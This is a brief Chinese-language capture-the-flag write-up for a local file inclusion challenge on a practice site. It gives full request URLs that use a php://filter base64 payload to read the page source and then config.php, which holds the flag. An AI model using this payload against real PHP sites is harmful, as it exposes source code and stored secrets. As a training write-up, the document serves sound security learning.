# inndy web LFI
* [題目網址](https://hackme.inndy.tw/lfi/)
1. 查看原始碼，發現有個被註解掉的網址:?page=pages/flag
2. 進去 https://hackme.inndy.tw/lfi/?page=pages/flag 看到 Can you read the flag?，加上題目提示說用 php://filter，可以猜測有些 php 的特殊字符被轉換成其他東西，所以現在用 base64 印出原本內容
3. https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag ，把得到的 base64 字串 decode，結果出現 Can you read the flag<?php require('config.php'); ?>? ，就是說在 pages 中，有個檔案叫做 config.php
4. https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config，又得到 base64 字串，拿去 decode 就是 flag 了